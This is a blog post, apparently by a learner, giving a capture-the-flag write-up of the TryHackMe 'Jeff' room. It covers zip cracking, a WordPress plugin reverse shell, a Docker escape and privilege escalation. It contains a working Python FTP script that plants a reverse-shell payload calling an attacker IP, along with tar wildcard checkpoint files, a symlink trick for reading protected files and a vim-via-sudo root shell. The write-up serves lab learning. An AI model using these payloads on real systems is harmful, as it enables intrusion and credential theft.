@@ -1,0 +1,511 @@
+---
+layout: post
+title: Tryhackme-Jeff Writeup
+hide_title: false
+color: grey
+permalink: /ctf/thm-jeff
+#feature-img: 
+#author: ickl0cc
+tags: [Tryhackme , docker , vim , wp]
+excerpt_separator: <!--more-->
+---
+
+<img src="/assets/img/thm/jeff/title.png" width="800" height="120" ><br>
+
+**Difficulty:** Hard<br>
+<!--more-->
+
+**URL:** [Jeff](https://tryhackme.com/room/jeff)
+
+## Intro
+
+Namaste everyone. Welcome back! this time it is the writeup of jeff box. To be honest it was really difficult for me. But at the end i solved it. Its going to be a long read.
+
+So some info about the box before we begin. We exploit the wordpress site and find that its inside a docker container and you need to escape out of it. Once you escape you need to find a way to get jeff's password which you don't have permission to access. Once you are jeff you can get user flag and privilege escalation is really easy !
+
+***
+
+## Scanning and Enumeration
+
+```console
+Nmap scan report for 10.10.189.32
+Host is up (0.44s latency).
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
+|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
+|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+The box has ssh and http open. For the most of time we will be dealing with the http server
+
+## - Port 80
+
+Looking at the site its an blank page. Viewing the source we find that we need to put `jeff.thm` into our `/etc/hosts`
+
+Let's visit `jeff.thm` now
+
+<a href="/assets/img/thm/jeff/jeffhome.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/jefffhome.png"></a>
+
+Browsing at the site we don't find anything interesting. So i fired out gobuster to see if there are hidden directories
+
+```bash
+gobuster dir -u jeff.thm -w /usr/share/wordlists/dirb/common.txt
+```
+<a href="/assets/img/thm/jeff/gobust.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/gobust.png"></a>
+
+Looking at the scan instantly `backups` caught my attention. I may look into `uploads` later on. inside `backups` it must contain a backup of something right? 
+So i went to `[http://jeff.thm/backups/backup.zip](http://jeff.thm/backups/backup.zip)` to try my luck and luckily there was a zip file and it started downloading.
+
+<a href="/assets/img/thm/jeff/backups.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/backups.png"></a>
+
+Let's unzip it and see what it contains
+
+<a href="/assets/img/thm/jeff/backupspassword.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/backupspassword.png"></a>
+
+Oops! It's password protected. So in this phase i had no option but only to bruteforce it.
+
+For bruteforcing i used a tool `fcrackzip`. You can easily install by running `apt install fcrackzip`
+
+```bash
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip
+```
+
+`D` : Run a dictionary attack
+
+`-p` : password list
+
+Use `-v` to verbose output
+
+Within a few seconds it found the password
+
+```console
+possible pw found: [REDACTED]
+```
+
+Let's unzip and see the contents inside
+
+```bash
+unzip backup.zip
+```
+
+```console
+root@kali:~/Desktop/tryhackme/jeff/backup# ls -la
+total 20
+drwxrwx--- 3 root root 4096 Sep 26 05:14 .
+drwxr-xr-x 4 root root 4096 Sep 26 02:41 ..
+drwxrwx--- 2 root root 4096 Sep 26 05:14 assets
+-rwxrwx--- 1 root root 1178 May 14 11:20 index.html
+-rwxrwx--- 1 root root   41 May 14 11:20 wpadmin.bak
+```
+
+Looking inside we can say it's the backup of wordpress website and  `wpadmin.bak` should contain a creds for the login.
+
+```console
+wordpress password is: [REDACTED] 
+```
+
+But wait a moment we didn't find any wordpress running at the `jeff.thm` and inside it's directories but the developer said that he was building a wordpress site and he will be upgrading in the future so there must be a subdomain where he might have hosted wordpress.
+
+We can also find the subdomains of the site from `gobuster`
+
+```bash
+gobuster vhost -u jeff.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+
+And it did found a subdomain where wordpress is hosted
+
+```console
+Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
+```
+
+<a href="/assets/img/thm/jeff/wp.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/wp.png"></a>
+
+We know the password from the `[backup.zip](http://backup.zip)` and looking at the site `jeff` maybe the username. Let's login going to `http://wordpress.jeff.thm/wp-admin`
+
+## Exploitation
+
+<a href="/assets/img/thm/jeff/wp_dashboard.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/wp_dashboard.png"></a>
+
+Let's get a reverse shell so we can go deep inside the box. There are multiple ways to get reverse shell but this time i am going to get it from using malicious plugin. I did the injecting malicious code in themes in [internal writeup](https://theprashil.github.io/ctf/thm-internal). So i wanted to try something new
+
+You can get the malicious code from the github link
+
+We need to zip it and install in order to work.
+
+```bash
+zip final.zip ./revshell.php
+```
+
+And upload it to the `Plugins > Add New > Upload Plugin >` and install it.
+
+Fire up a listener in you attacker box and activate the plugin to get reverse shell
+
+<a href="/assets/img/thm/jeff/reverseshell.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/reverseshell.png"></a>
+
+Looking inside we are in a docker container which has it's own system. So we are limited. At this point i was searching for a way to escape this container and enumerated further. I found a interesting file inside the /var/www/html named ftp_backup.php
+
+```console
+www-data@Jeff:/var/www/html$ ls
+ls
+ftp_backup.php
+index.php
+license.txt
+readme.html
+wp-activate.php
+wp-admin
+wp-blog-header.php
+wp-comments-post.php
+wp-config-sample.php
+wp-config.php
+wp-content
+wp-cron.php
+wp-includes
+wp-links-opml.php
+wp-load.php
+wp-login.php
+wp-mail.php
+wp-settings.php
+wp-signup.php
+wp-trackback.php
+xmlrpc.php
+```
+Looking inside that script...
+
+```php
+<?php
+/* 
+    Todo: I need to finish coding this database backup script.
+          also maybe convert it to a wordpress plugin in the future.
+*/
+$dbFile = 'db_backup/backup.sql';
+$ftpFile = 'backup.sql';
+
+$username = "backupmgr";
+$password = "[REDACTED]";
+
+$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host
+
+if( ! ftp_login($ftp, $username, $password) ){
+    die("FTP Login failed.");
+}
+
+$msg = "Upload failed";
+if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
+    $msg = "$file was uploaded.\n";
+}
+
+echo $msg;
+ftp_close($conn_id);
+```
+
+**My thoughts when i looked  the script:**
+
+- It is somehow looking like a script to upload files to ftp
+- It has a host but it is internal access only
+- The script isn't complete yet
+
+So at this moment i struggled as well. I was learning as well and it felt like it was out of my league. I knew i was in a docker container and i had to escape it. Finding this script i knew i had a ftp login creds which i can use but didn't **know how can i exploit ?**
+
+I took some help and research about **[wildcard exploitation](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)** 
+
+**I will try my best to explain it to you**
+
+I curl to the host we are given with the creds and list what's inside using this
+
+```bash
+curl -v -s -P- 'ftp://backupmgr:[REDACTED]@172.20.0.1/'
+```
+
+`-v` verbose output
+
+`-s` silent mode
+
+`-P` we need to have p
+
+```console
+* Connection #0 to host 172.20.0.1 left intact
+drwxr-xr-x    2 1001     1001         4096 May 18 16:14 files
+www-data@Jeff:/var/www/html$
+```
+Okay! there's a `files` directory 
+
+**So here's what i am gonna do**
+
+- Create a python script to upload a reverse shell to that `files` so that when the connection is established we can escape the container
+
+**But how?**
+
+- When our exploit is at the ftp it gets executed using **TAR Wildcard Exploitation**
+
+Here's the python script i will explain it as well
+
+```python
+#!/usr/bin/env python3.7
+
+from ftplib import FTP
+import io
+
+#Connecting to the host
+ftp = FTP(host= '172.20.0.1')
+
+#login for ftp user
+ftp.login(user= "backupmgr", passwd= "[REDACTED]")
+ftp.getwelcome()
+
+ftp.set_pasv(False)
+ftp.dir()
+ftp.cwd('/files')
+
+payload = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.140",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
+empty = io.BytesIO(b'')
+
+ftp.storlines('STOR exploit.sh', payload)
+ftp.storlines('STOR --checkpoint=1', empty)
+ftp.storlines('STOR --checkpoint-action=exec=sh exploit.sh', empty)
+
+ftp.quit()
+```
+
+### **Explanation**
+
+- From the `ftplib` we are going to import `FTP` module which is required for ftp connection
+- We then provide the `host` , `username` and the `password` for the ftp server.
+
+We set it to active mode because the passive mode won't work out
+
+```python
+#In the active mode -  the data connection is incoming to the FTP client and outgoing from the FTP server
+# In the passive mode - the data connection is incomting to the FTP server and outfgoing from the FTP client
+ftp.set_pasv(False) #sets it to the active mode
+```
+
+- Then we are going to change our directory to `/files`
+
+There are two common modes for transferring files via FTP, `ascii` and `binary`
+Ascii mode transfers files as 'text'. Examples of ascii files would be .txt, .asp, .html, and .php files
+Binary mode transfers files as raw data. Examples of binary files would be .wav, .jpg, .gif, and mp3 files
+
+So we are using ascii mode to transfer files
+
+- We create two files one `payload`  which contains our reverse shell and another `empty`
+
+`ftp.storlines()`: Store a file in ASCII transfer mode.
+
+```python
+ftp.storlines('STOR shell.sh',payload)
+ftp.storlines('STOR --checkpoint=1',empty)
+ftp.storlines('STOR --checkpoint-action=exec=sh shell.sh',empty)
+```
+
+So here we are using **TAR wildcard exploitation** to make it work. Outside the container there's a crontab to backup everything inside there every min so it is how the above code gets executed and we get a reverse shell. 
+
+`ftp.quit()` just exits the connection. 
+
+Ready? Let's upload to the container by creating a server and run it
+
+<a href="/assets/img/thm/jeff/exploit.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/exploit.png"></a>
+
+Make the file executable
+
+```bash
+chmod +x exploit.py
+```
+
+and run it. In your attacker machine open a listener at `1234` and in a min the cronjob will execute our shell.
+
+<a href="/assets/img/thm/jeff/pivot.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/pivot.png"></a>
+
+let's get a fully interactive tty shell using python and when we list the current directory
+
+```console
+backupmgr@tryharder:~/.ftp/files$ ls -la
+total 12
+drwxr-xr-x 2 backupmgr backupmgr 4096 Sep 26 11:15  .
+drwxr-xr-x 3 nobody    nogroup   4096 May 11 01:32  ..
+-rwxr-xr-x 1 backupmgr backupmgr    0 Sep 26 11:15 '--checkpoint=1'
+-rwxr-xr-x 1 backupmgr backupmgr    0 Sep 26 11:15 '--checkpoint-action=exec=sh exploit.sh'
+-rwxr-xr-x 1 backupmgr backupmgr  228 Sep 26 11:15  exploit.sh
+```
+
+That's how the cronjob exploit happened , it reached to the `checkpoint 1` and it instructed to execute a shell `exploit.sh` which contains our payload to give reverse shell. Hope you understood it. It took me a lot of time to understand.
+
+Now we got outside the container we can easily move ahead. We are the user `backupmgr` and we can't access the user `jeff`
+
+```console
+backupmgr@tryharder:~/.ftp/files$ cd /home
+backupmgr@tryharder:/home$ ls -la
+total 16
+drwxr-xr-x  4 root      root      4096 May 10 22:28 .
+drwxr-xr-x 25 root      root      4096 May 23 14:40 ..
+drwxr-xr-x  7 backupmgr backupmgr 4096 May 24 13:25 backupmgr
+drwx------  5 jeff      jeff      4096 May 18 16:09 jeff
+backupmgr@tryharder:/home$
+```
+
+So to escalate our privilege let's see what are the files owned by `jeff`
+
+```bash
+find / -user jeff 2>/dev/null
+
+```
+
+hmm...
+
+```console
+backupmgr@tryharder:/home$ find / -user jeff 2>/dev/null
+/opt/systools
+/opt/systools/systool
+/home/jeff
+/var/backups/jeff.bak
+backupmgr@tryharder:/home$
+```
+
+`/var/backups/jeff.bak` contains the creds of `jeff` which we can't access right now..
+
+`/opt/systools/systool` seems interesting
+
+```console
+backupmgr@tryharder:/opt/systools$ file systool 
+systool: setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a1b3c82d2e7f7a8238bc85dabfef348c6ca50557, for GNU/Linux 3.2.0, not stripped
+backupmgr@tryharder:/opt/systools$ ls -la
+total 32
+drwxrwxrwx 2 jeff jeff   4096 May 24 15:08 .
+drwxr-xr-x 4 root root   4096 May 24 13:13 ..
+-rwxrwxrwx 1 root root    108 May 24 13:19 message.txt
+-rwxr-sr-x 1 jeff pwman 17160 May 24 13:18 systool
+backupmgr@tryharder:/opt/systools$
+```
+
+Looking at the files `systool` we can execute it. Before that let's see what is inside the `message.txt`
+
+```console
+backupmgr@tryharder:/opt/systools$ cat message.txt 
+Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
+backupmgr@tryharder:/opt/systools$
+```
+
+Let's run `systool`
+
+```console
+backupmgr@tryharder:/opt/systools$ ./systool 
+Welcome to Jeffs System Administration tool.
+This is still a very beta version and some things are not implemented yet.
+Please Select an option from below.
+1 ) View process information.
+2 ) Restore your password.
+3 ) Exit 
+Chose your option: 2
+
+Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
+
+1 ) View process information.
+2 ) Restore your password.
+3 ) Exit 
+Chose your option: 3
+backupmgr@tryharder:/opt/systools$
+```
+
+Okay what we can see is option 2 reads the file from `message.txt`
+
+So how can we exploit it to give us password of jeff?
+
+We can delete the message.txt and link the `/opt/backups/jeff.bak` to `message.txt` and when the tool runs it tries to read the file from `jeff.bak`and displays whats inside .
+
+Let's try out
+
+```console
+backupmgr@tryharder:/opt/systools$ rm message.txt 
+backupmgr@tryharder:/opt/systools$ ln -s /var/backups/jeff.bak message.txt
+backupmgr@tryharder:/opt/systools$ ls -la
+total 28
+drwxrwxrwx 2 jeff      jeff       4096 Sep 26 11:34 .
+drwxr-xr-x 4 root      root       4096 May 24 13:13 ..
+lrwxrwxrwx 1 backupmgr backupmgr    21 Sep 26 11:34 message.txt -> /var/backups/jeff.bak
+-rwxr-sr-x 1 jeff      pwman     17160 May 24 13:18 systool
+backupmgr@tryharder:/opt/systools$
+```
+
+```console
+backupmgr@tryharder:/opt/systools$ ./systool 
+Welcome to Jeffs System Administration tool.
+This is still a very beta version and some things are not implemented yet.
+Please Select an option from below.
+1 ) View process information.
+2 ) Restore your password.
+3 ) Exit 
+Chose your option: 2
+
+Your Password is: [REDACTED]
+1 ) View process information.
+2 ) Restore your password.
+3 ) Exit 
+Chose your option:
+```
+
+There you go.. 
+
+We know `ssh`  is open . Let's ssh into `jeff@jeff.thm` with the above creds
+
+Listing out the files there's `user.flag` which is our first flag. Also you need to md5 the inside content to upload it. i will leave this to you
+
+## Privilege Escalation
+
+It's really easy to escalate to root.
+
+But the issue is `jeff` is running on a restricted shell so we need to escape out of it
+
+The one i used is
+
+`ssh jeff@jeff.thm -t "bash --noprofile"`
+
+What it does is it starts the remote shell without loading “rc” profile ( where most of the limitations are often configured) 
+
+When you type `sudo -l`
+
+```console
+jeff@tryharder:~$ sudo -l
+[sudo] password for jeff: 
+Matching Defaults entries for jeff on tryharder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jeff may run the following commands on tryharder:
+    (ALL) /usr/bin/crontab
+jeff@tryharder:~$
+```
+
+Easy right ?
+
+so i ran `sudo /usr/bin/crontab -e`
+
+which opened `vim` and for getting shell you just need to type `:!/bin/sh`
+
+<a href="/assets/img/thm/jeff/vim.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/vim.png"></a>
+
+Great now you are now `root`
+
+<a href="/assets/img/thm/jeff/root.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/root.png"></a>
+
+and the final flag is in the `/root` 
+
+## Conclusion
+
+That's it folks! If you read whole writeup i hope it didn't bore you. i tried to explain in deep as much as possible. There was a complete learning for me as well. It was worth the time to solve this challenge and learn new things. Okay so I will see you again in next writeup.
+
+~ickl0cc
+
+
+
+
+
+
+
+
+
+
+
